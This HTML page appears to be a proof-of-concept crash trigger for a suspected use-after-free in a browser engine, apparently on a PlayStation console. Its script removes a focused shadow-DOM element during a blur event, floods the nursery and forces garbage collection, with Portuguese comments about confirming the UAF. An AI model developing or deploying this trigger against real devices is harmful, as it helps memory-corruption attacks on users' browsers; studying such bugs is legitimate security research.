<!DOCTYPE html>
<html>
<body>
<p>This test passes if it does not crash.</p>
<div id="host"></div>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

function log(msg) {
    var d = document.createElement('div');
    d.textContent = msg;
    result.appendChild(d);
}

// Victim criado agora mas NÃO focado ainda
var shadowRoot = host.attachShadow({ mode: 'open' });
var victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable';
shadowRoot.appendChild(victim);

document.addEventListener('blur', function onBlur(e) {
    log('[Blur] target: ' + e.target.tagName);

    victim.remove();

    // Criar ~50k objetos novos APÓS limpar a referência C++
    // Esses objetos vão para o Nursery JUNTO com o wrapper liberado do victim
    var flood = [];
    for (var i = 0; i < 50000; i++) {
        flood.push({ a: i, b: String(i), c: { x: i } });
    }

    // Nulificar victim: JSElement wrapper agora elegível (está no Nursery
    // porque o próprio wrapper foi alocado junto com os objetos novos se
    // tivermos sorte, OU o Nursery vai coletar junto na próxima rodada)
    victim = null;
    flood = null;

    // gc() pressiona o Nursery — onde o wrapper está ou chegou
    gc();

    log('[After GC] — se crashou antes daqui: UAF confirmado');
    document.removeEventListener('blur', onBlur, true);
}, true);

// Focar O MAIS TARDE POSSÍVEL — manter no Nursery
requestAnimationFrame(function() {
    setTimeout(function() {
        victim.focus();
        log('[Setup] focused: ' + (host.shadowRoot.activeElement === victim));
        log('[Ready] Botao PS → XMB → volte');
    }, 0);
});

window.addEventListener('blur', function() { log('[Window] blur'); });
document.addEventListener('visibilitychange', function() {
    log('[Visibility] ' + document.visibilityState);
    if (document.visibilityState === 'visible')
        result.textContent += '\nPASS (sem crash)';
});
</script>
</body>
</html>
